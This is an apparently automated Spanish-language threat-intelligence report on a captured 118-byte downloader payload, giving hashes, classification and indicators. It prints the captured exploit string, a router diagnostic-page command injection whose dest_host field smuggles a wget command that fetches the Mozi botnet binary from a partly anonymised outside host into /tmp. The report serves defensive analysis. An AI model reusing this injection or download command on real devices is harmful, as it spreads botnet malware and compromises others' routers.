# 🧬 Payload Analysis

`7f8d1e3c2bf971075a57ad5d77cdc4c1dad24935d0d9f451ff9c0aec2fb91241`

## 📌 Resumen

Texto ASCII de 118 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://14.231.104.XXX:59094/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://14.231.104.XXX:59094/Mozi.m -O ->/tmp/gpon80` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/7f8d1e3c2bf971075a57ad5d77cdc4c1dad24935d0d9f451ff9c0aec2fb91241.md](../../../../../malware-like/oraculo/downloader/7f8d1e3c2bf971075a57ad5d77cdc4c1dad24935d0d9f451ff9c0aec2fb91241.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:34:34.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `7f8d1e3c2bf971075a57ad5d77cdc4c1dad24935d0d9f451ff9c0aec2fb91241`
- **MD5:** `3d5535be181ec71625cb76a0515e8f0e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 118 B |
| Entropía | 5.13 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://14.231.104.XXX:59094/Mozi.m+-O+->/tmp/gpon80;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://14.231.104.XXX:59094/Mozi.m+-O+- | strings |
| ip | 14.231.104.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://14.231.104.XXX:59094/Mozi.m+-O+->/tmp/gpon80; | strings |
| hash | 7f8d1e3c2bf971075a57ad5d77cdc4c1dad24935d0d9f451ff9c0aec2fb91241 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
